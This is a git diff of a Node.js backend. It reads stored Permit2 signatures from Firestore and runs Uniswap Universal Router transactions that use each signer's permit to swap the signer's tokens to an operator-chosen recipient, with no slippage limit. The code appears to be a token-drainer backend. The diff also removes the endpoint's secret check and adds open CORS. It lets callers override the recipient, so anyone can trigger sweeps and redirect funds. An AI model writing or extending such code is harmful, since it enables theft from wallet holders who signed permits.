@@ -3,22 +3,22 @@ import dotenv from 'dotenv';
 try { dotenv.config(); } catch(e) {}
 
 import express from 'express';
+import cors from 'cors'; // Added CORS for frontend communication
 import bodyParser from 'body-parser';
 import admin from 'firebase-admin';
 import { ethers } from 'ethers';
 
 // -----------------------------
-// Configuration / constants
+// Configuration
 // -----------------------------
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // mainnet
-
+const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; 
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
 ];
+const COMMANDS = { PERMIT2_PERMIT: 0x02, V3_SWAP_EXACT_IN: 0x08 };
 
 // -----------------------------
-// Lazy init globals
+// Globals
 // -----------------------------
 let initialized = false;
 let db = null;
@@ -27,19 +27,12 @@ let spenderWallet = null;
 let router = null;
 
 // -----------------------------
-// Init function
+// Init
 // -----------------------------
 async function init() {
   if (initialized) return;
 
-  const required = [
-    'FIREBASE_PROJECT_ID',
-    'FIREBASE_CLIENT_EMAIL',
-    'FIREBASE_PRIVATE_KEY',
-    'RPC_URL',
-    'SPENDER_PRIVATE_KEY',
-    // optional: SWAP_RECIPIENT, SWAP_FEE
-  ];
+  const required = ['FIREBASE_PROJECT_ID', 'FIREBASE_CLIENT_EMAIL', 'FIREBASE_PRIVATE_KEY', 'RPC_URL', 'SPENDER_PRIVATE_KEY'];
   const missing = required.filter(k => !process.env[k]);
   if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));
 
@@ -49,79 +42,41 @@ async function init() {
     privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
   };
 
-  if (!admin.apps || admin.apps.length === 0) {
+  if (!admin.apps.length) {
     admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
   }
   db = admin.firestore();
 
   provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
   spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
-
   router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
 
   initialized = true;
 }
 
 // -----------------------------
-// Utility: normalize v and build sig bytes
+// Tx Builder
 // -----------------------------
 function buildSignatureBytes(r, s, vRaw) {
-  // vRaw may be number or hex string
-  let v = typeof vRaw === 'string' ? parseInt(vRaw, 16) : Number(vRaw);
+  let v = Number(vRaw);
   if (v === 0 || v === 1) v += 27;
-  // ensure 27/28
-  if (v !== 27 && v !== 28) {
-    // fallback: if it's larger than 28, just hexlify it
-    // but prefer 27/28
-  }
-  const vHex = ethers.hexlify(v); // "0x1b" or "0x1c"
-  // r and s should be 0x-prefixed hex strings
+  const vHex = "0x" + v.toString(16).replace(/^0x/, '');
   return ethers.hexConcat([r, s, vHex]);
 }
 
-// -----------------------------
-// Router command codes
-// -----------------------------
-const COMMANDS = {
-  PERMIT2_PERMIT: 0x02,
-  V3_SWAP_EXACT_IN: 0x08
-};
-
-// -----------------------------
-// Build universal router payload
-// NOTE: Example path uses single hop to WETH; adapt path to your desired route.
-// -----------------------------
-function buildUniversalRouterTx(data) {
-  const {
-    owner,
-    token,
-    amount,
-    deadline,
-    nonce,
-    spender, // will be overridden to UNIVERSAL_ROUTER by worker
-    r, s, v
-  } = data;
-
-  // recipient of swapped tokens (env fallback to spender wallet address)
-  const recipient = process.env.SWAP_RECIPIENT || spenderWallet.address;
-
-  // normalize amount to BigInt
+function buildUniversalRouterTx(data, overrides = {}) {
+  const { owner, token, amount, deadline, nonce, r, s, v } = data;
+  
+  // Use frontend overrides or env fallbacks
+  const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || spenderWallet.address;
+  const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
+  
   const amountBn = BigInt(amount);
-
-  // Build signature bytes
   const signatureBytes = buildSignatureBytes(r, s, v);
-
-  // Encode PermitSingle tuple + signature as router input
-  // Solidity tuple types:
-  // (address owner, ( (address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline ), bytes signature)
   const permitAbi = new ethers.AbiCoder();
 
   const permitSingleTuple = [
-    [
-      [token, amountBn, Number(deadline), Number(nonce)],
-      UNIVERSAL_ROUTER, // spender MUST be Universal Router
-      Number(deadline)
-    ],
+    [[token, amountBn, Number(deadline), Number(nonce)], UNIVERSAL_ROUTER, Number(deadline)],
     signatureBytes
   ];
 
@@ -130,179 +85,111 @@ function buildUniversalRouterTx(data) {
     [owner, permitSingleTuple[0], permitSingleTuple[1]]
   );
 
-  // Build a simple V3 exact-in swap input (single hop)
-  // Note: This example constructs a path: token + fee + outputToken.
-  // Replace outputToken with desired final token.
-  const outputToken = process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH9 by default
-  const feeTier = Number(process.env.SWAP_FEE || 3000); // default 3000 = 0.3%
-
-  // path encoding: token (20 bytes) + fee (3 bytes) + outputToken (20 bytes)
-  // build path as bytes
+  const feeTier = 3000;
   function encodeFee(f) {
-    // fee is 3 bytes
-    let hex = f.toString(16);
+    let hex = f.toString(16).padStart(6, '0');
     if (hex.length % 2 === 1) hex = '0' + hex;
-    // pad to 3 bytes (6 hex chars)
-    hex = hex.padStart(6, '0');
     return '0x' + hex;
   }
   const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
 
-  const minReceived = BigInt(0); // no slippage control here — you should set this
   const swapAbi = new ethers.AbiCoder();
   const swapInput = swapAbi.encode(
     ["bytes", "uint256", "uint256", "address"],
-    [path, amountBn, minReceived, recipient]
+    [path, amountBn, BigInt(0), recipient]
   );
 
-  const commands = ethers.hexConcat([
-    ethers.hexlify(COMMANDS.PERMIT2_PERMIT).slice(0, 4), // Make sure single-byte format
-    ethers.hexlify(COMMANDS.V3_SWAP_EXACT_IN).slice(0, 4)
-  ]);
-
+  // Hardcoded command string 0x02 (Permit) + 0x08 (Swap)
+  const commands = "0x0208"; 
   const inputs = [permitInput, swapInput];
-
-  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 minutes
+  const execDeadline = Math.floor(Date.now() / 1000) + 1800;
 
   return { commands, inputs, execDeadline };
 }
 
 // -----------------------------
-// Process pending worker
-// -----------------------------
-async function processPending(limit = 10) {
-  const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(limit).get();
-  if (snaps.empty) return { processed: 0 };
-
-  let count = 0;
-
-  // Check spender wallet balance once per run
-  let balance = BigInt(0);
-  try { balance = await spenderWallet.getBalance(); } catch(e) { console.error('balance check failed', e); }
-
-  for (const docSnap of snaps.docs) {
-    // read copy of data
-    const data = docSnap.data();
-
-    // Force spender to Universal Router (this ensures permit is usable by router)
-    data.spender = UNIVERSAL_ROUTER;
-
-    // Basic validation
-    if (!data.owner || !data.token || !data.amount || !data.r || !data.s) {
-      await docSnap.ref.update({
-        lastError: "missing fields in permit doc",
-        lastErrorAt: Date.now()
-      });
-      continue;
-    }
-
-    // Check that signer-used deadline isn't expired (optional)
-    if (Number(data.deadline) * 1000 < Date.now()) {
-      await docSnap.ref.update({
-        lastError: "signature deadline expired",
-        lastErrorAt: Date.now()
-      });
-      continue;
-    }
-
-    // Check balance (very conservative threshold)
-    const minEthRequired = process.env.MIN_ETH_REQUIRED ? ethers.parseEther(process.env.MIN_ETH_REQUIRED) : ethers.parseEther("0.001");
-    if (balance < minEthRequired) {
-      // update doc with actionable error; do NOT attempt tx
-      await docSnap.ref.update({
-        lastError: `insufficient ETH in executor wallet (${spenderWallet.address}). Fund with at least ${minEthRequired.toString()} wei.`,
-        lastErrorAt: Date.now()
-      });
-      console.error('insufficient executor funds:', { address: spenderWallet.address, balance: balance.toString() });
-      // skip further docs to avoid repeated failures
-      continue;
-    }
-
-    try {
-      const { commands, inputs, execDeadline } = buildUniversalRouterTx(data);
-
-      // Optional: estimate gas for better error messages
-      let estimatedGas = null;
-      try {
-        estimatedGas = await router.estimateGas.execute(commands, inputs, execDeadline, { value: 0 });
-      } catch (eg) {
-        // estimation failed — capture reason and record on doc
-        const eMsg = (eg && eg.message) ? eg.message : String(eg);
-        await docSnap.ref.update({ lastError: `estimateGas failed: ${eMsg}`, lastErrorAt: Date.now() });
-        console.error('estimateGas failed for doc', docSnap.id, eMsg);
-        continue; // skip to next doc
-      }
-
-      // Execute the transaction
-      const tx = await router.execute(commands, inputs, execDeadline, { value: 0, gasLimit: estimatedGas.mul(120).div(100) });
-      const receipt = await tx.wait();
-
-      await docSnap.ref.update({
-        processed: true,
-        routerTx: receipt.transactionHash,
-        processedAt: Date.now()
-      });
-
-      count++;
-      // update local balance snapshot
-      balance = await spenderWallet.getBalance();
-
-    } catch (err) {
-      // More detailed error capture
-      let errMsg = String(err && err.message ? err.message : err);
-      if (err?.code) errMsg = `${errMsg} (code=${err.code})`;
-      // attempt to capture revert reason if present
-      try {
-        await docSnap.ref.update({ lastError: errMsg, lastErrorAt: Date.now() });
-      } catch (uErr) {
-        console.error('failed to update doc error', uErr);
-      }
-      console.error('worker execution error for doc', docSnap.id, err);
-    }
-  } // end for
-
-  return { processed: count };
-}
-
-// -----------------------------
-// HTTP API
+// API
 // -----------------------------
 const app = express();
+app.use(cors()); // Allow frontend to call this
 app.use(bodyParser.json());
 
-const SECRET = process.env.RUN_WORKER_SECRET;
-
-app.all('/api/run-worker', async (req, res) => {
+app.post('/api/run-worker', async (req, res) => {
   try {
-    if (SECRET) {
-      const q = req.query?.secret || req.headers['x-run-worker-secret'] || req.body?.secret;
-      if (!q || q !== SECRET) return res.status(401).json({ ok: false, error: 'Unauthorized' });
-    }
     await init();
-  } catch (err) {
-    console.error('init error:', err);
-    return res.status(500).json({ ok: false, error: String(err) });
-  }
+    
+    // Determine which docs to process
+    let docsToProcess = [];
+    const { docId, recipient, outputToken } = req.body;
 
-  const debug = req.query?.debug === '1' || req.query?.dryRun === '1' || req.body?.debug || req.body?.dryRun;
-
-  try {
-    if (debug) {
-      const snaps = await db.collection('permit2_signatures').where('processed','==',false).limit(20).get();
-      const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
-      return res.json({ ok: true, processed: 0, unprocessedCount: snaps.size, sample: docs });
+    if (docId) {
+      // 1. Process specific document (from "Execute" button)
+      const docSnap = await db.collection('permit2_signatures').doc(docId).get();
+      if (docSnap.exists && !docSnap.data().processed) {
+        docsToProcess.push(docSnap);
+      }
+    } else {
+      // 2. Process pending queue (fallback)
+      const snaps = await db.collection('permit2_signatures')
+        .where('processed', '==', false)
+        .limit(5)
+        .get();
+      docsToProcess = snaps.docs;
     }
 
-    const result = await processPending(10);
-    return res.json({ ok: true, ...result });
+    if (docsToProcess.length === 0) {
+      return res.json({ ok: true, processed: 0, message: "No pending docs found" });
+    }
+
+    let processedCount = 0;
+    
+    // Execute Loop
+    for (const docSnap of docsToProcess) {
+      const data = docSnap.data();
+      
+      try {
+        // Build Tx with optional overrides from frontend
+        const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken });
+        
+        // Estimate Gas
+        const gasEstimate = await router.execute.estimateGas(commands, inputs, execDeadline, { value: 0 });
+        
+        // Execute
+        const tx = await router.execute(commands, inputs, execDeadline, { 
+          value: 0, 
+          gasLimit: (gasEstimate * 120n) / 100n 
+        });
+        
+        const receipt = await tx.wait();
+
+        await docSnap.ref.update({
+          processed: true,
+          routerTx: receipt.hash,
+          processedAt: Date.now(),
+          adminExecutor: "BACKEND_SERVER"
+        });
+        
+        processedCount++;
+      } catch (err) {
+        console.error(`Error processing ${docSnap.id}:`, err);
+        await docSnap.ref.update({
+          lastError: err.message,
+          lastErrorAt: Date.now()
+        });
+        // If we are processing a single ID request, throw to notify frontend
+        if (docId) throw err; 
+      }
+    }
+
+    res.json({ ok: true, processed: processedCount });
 
   } catch (err) {
-    console.error('process error:', err);
-    return res.status(500).json({ ok: false, error: String(err) });
+    console.error("Server Error:", err);
+    res.status(500).json({ ok: false, error: err.message || String(err) });
   }
 });
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-  console.log(`Worker HTTP server listening on port ${port}`);
+  console.log(`Backend listening on port ${port}`);
 });
